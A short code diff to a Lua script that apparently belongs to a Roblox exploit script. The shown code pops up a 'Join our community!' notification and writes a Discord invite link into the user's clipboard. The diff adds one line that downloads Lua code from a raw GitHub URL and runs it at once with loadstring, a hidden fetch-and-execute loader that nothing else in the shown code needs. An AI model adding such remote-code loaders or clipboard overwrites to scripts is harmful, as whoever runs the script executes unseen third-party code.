@@ -125,4 +125,5 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 	Text = "Join our community!",
 	Duration = 25;
 })
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 setclipboard("https://discord.gg/R2dbGKyqqE")
